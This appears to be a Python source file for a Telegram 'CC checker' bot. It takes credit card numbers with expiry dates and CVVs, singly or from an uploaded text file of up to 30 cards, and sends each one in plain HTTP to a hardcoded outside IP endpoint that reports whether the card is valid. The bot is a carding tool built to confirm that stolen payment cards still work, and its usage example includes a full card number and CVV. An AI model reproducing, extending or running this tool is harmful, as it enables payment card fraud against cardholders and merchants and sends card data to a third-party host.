import logging
import requests
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# === CONFIG ===
BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
ADMIN_ID = 6503335261  # optional for future control
MAX_CARDS = 30
API_URL = "http://46.202.163.144:5050/v1/b3/cc="

# === ENABLE LOGGING ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# === GLOBAL STORAGE ===
uploaded_cards = {}

# === HANDLERS ===

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Send /b3 <cc|mm|yy|cvv> to check a card or upload a .txt file and use /mass")

async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) == 0:
        await update.message.reply_text("⚠️ Format: /b3 4019240132451694|08|26|256")
        return
    cc_data = context.args[0]
    result = send_to_api(cc_data)
    await update.message.reply_text(result)

def send_to_api(cc):
    try:
        url = f"{API_URL}{cc}"
        response = requests.get(url, timeout=20)
        return f"✅ Result for {cc}:\n{response.text}"
    except Exception as e:
        return f"❌ Error checking {cc}:\n{str(e)}"

async def handle_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    file_path = f"/tmp/{update.message.chat_id}_cards.txt"
    await file.download_to_drive(file_path)

    with open(file_path, "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    uploaded_cards[update.message.chat_id] = lines[:MAX_CARDS]
    await update.message.reply_text(f"📄 Uploaded {len(lines[:MAX_CARDS])} cards. Now send /mass to start checking.")

async def mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cards = uploaded_cards.get(update.message.chat_id)
    if not cards:
        await update.message.reply_text("⚠️ No cards uploaded. Send a .txt file first.")
        return

    result_lines = []
    for i, card in enumerate(cards):
        result = send_to_api(card)
        result_lines.append(f"{i+1}. {result}")

    result_text = "\n\n".join(result_lines)
    if len(result_text) > 4000:
        result_file = f"/tmp/result_{update.message.chat_id}.txt"
        with open(result_file, "w") as f:
            f.write(result_text)
        await update.message.reply_document(InputFile(result_file), caption="✅ Mass check results")
    else:
        await update.message.reply_text(result_text)

# === MAIN ===

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("b3", b3))
    app.add_handler(CommandHandler("mass", mass))
    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_txt_file))

    print("🤖 Bot running...")
    app.run_polling()

if __name__ == '__main__':
    main()
